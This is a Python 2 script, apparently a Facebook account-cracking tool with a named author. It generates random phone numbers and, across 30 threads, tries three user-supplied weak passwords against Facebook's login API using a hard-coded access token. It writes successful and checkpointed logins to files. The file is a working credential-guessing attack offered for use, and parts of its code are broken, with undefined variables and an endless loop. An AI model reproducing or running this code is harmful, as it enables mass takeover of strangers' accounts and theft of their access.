#!/usr/bin/python2
# coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(90000000000000):
    nmbr = random.randint(1111111111, 9999999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    print '\n [\xc3\x97] Modul requests installing!...\n'
    os.system('pip2 install requests')


try:
    import concurrent.futures as concurrent
except ImportError:
    print '\n [\xc3\x97] Modul Futures installing!...\n'
    os.system('pip2 install futures')


try:
    import bs4
except ImportError:
    print '\n [\xc3\x97] Module bs4 installing!...\n'
    os.system('pip2 install bs4')


try:
    import figlet
except ImportError:
    print '\n [\xc3\x97] Module figlet installing!...\n'
    os.system('pkg install figlet')


try:
    import lolcat
except ImportError:
    print '\n [\xc3\x97] Module lolcat installing!...\n'
    os.system('pip2 install lolcat')
    os.system('clear')


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;93mding\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def lodhirt():
    lodhirt = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in lodhirt:
        print logo
        print '\x1b[1;93mPLEASE WAIT\x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
        os.system('clear')


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')


def lisensi():
    os.system('clear')
    login()


logo = """
          .dP"Y8 8888b.   88888 
          `Ybo."  8I  Yb     88 
          o.`Y8b  8I  dY o.  88 
          8bodP' 8888Y"  "bodP' 

          RANDOM-RANDINIT 1.0
"""

def login():
    
    
    os.system('clear')
    print logo
    print  """\033[1;92m╭┳✪✪╤──────────────────────────────────✪✪➛➢"""
    print '      AUTHOR  >  SHAHZAIN DAVID JOIYA\n'
    print '      GITHUB   >   SHAHZAIN-SDJ\n'
    print  """\033[1;92m╰┻✪✪╧──────────────────────────────────✪✪➛➢"""
    os.system('echo "[1] START \n[2] FOLLOW OWNER \n"| lolcat -a -d 20')
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\x1b[1;97m> \x1b[1;92m')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        
        os.system('clear')
        print logo
        print '' 
        os.system('echo "\n EXAMPLE ; 923003297188 \n"| lolcat -a -d 20')
        
        try:
            z = raw_input('\x1b[1;93m\nCODE : \x1b[1;92m')
            time.sleep(2)
            os.system('clear')
            print logo
            print''
            os.system('echo "\n USE THIS 4 PSWRD : 123456,123456789,1234567\n"| lolcat -a -d 20')
            print''
            pass1 = raw_input('\x1b[1;92mpassword : \x1b[1;92m')
            pass2 = raw_input('\x1b[1;92mpassword : \x1b[1;92m')
            pass3 = raw_input('\x1b[1;92mpassword : \x1b[1;92m')
            time.sleep(3)
            
            c = ''
            k = '10000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        tik()
        os.system('clear')
        os.system('xdg-open https://www.facebook.com/HATERZKAABBUZAINI2')
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    os.system('clear')
    print logo
    print''
    xxx = str(len(id))
    os.system('echo "\n TOTAL NUMBER : UNLINITED\n"| lolcat -a -d 20')
    os.system('echo "\n TO EXIT CTL+Z\n"| lolcat -a -d 20')
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:

            
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print ' \x1b[1;97m[\x1b[1;92mSDJ-OK]\x1b[1;97m]\x1b[1;92m  ' + k + c + user + '\x1b[1;97m | \x1b[1;92m' + pass1
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m[\x1b[1;90mAPROV4LL_N33D\x1b[1;91m]\x1b[1;90m  ' + k + c + user + '\x1b[1;97m | \x1b[1;90m' + pass1
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;97m[\x1b[1;92mSDJ-OK\x1b[1;97m]\x1b[1;92m  ' + k + c + user + '\x1b[1;97m | \x1b[1;92m' + pass2
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;91m[\x1b[1;90mAPROV4LL_N33D\x1b[1;91m]\x1b[1;90m  ' + k + c + user + '\x1b[1;97m | \x1b[1;90m' + pass2
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;97m[\x1b[1;92mSDJ-OK\x1b[1;97m]\x1b[1;92m  ' + k + c + user + '\x1b[1;97m | \x1b[1;92m' + pass3
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m[\x1b[1;90mAPROV4LL_N33D\x1b[1;91m]\x1b[1;90m  ' + k + c + user + '\x1b[1;97m | \x1b[1;90m' + pass3
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    
                         
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    login()
